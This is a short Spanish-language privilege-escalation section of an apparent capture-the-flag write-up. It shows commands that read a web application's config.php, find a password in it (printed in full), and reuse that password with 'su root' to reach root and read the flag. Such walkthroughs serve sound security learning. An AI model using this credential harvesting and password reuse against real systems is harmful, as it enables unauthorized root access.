## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
ls -la /var/www/html
cat /var/www/html/config.php
```

Aqui encontramos una contraseña. Intentamos ponerla para root

```bash
su root
Password: uhc-9qual-global-pw

whoami

#Output
root
```

Ya somos root y podemos leer la flag.
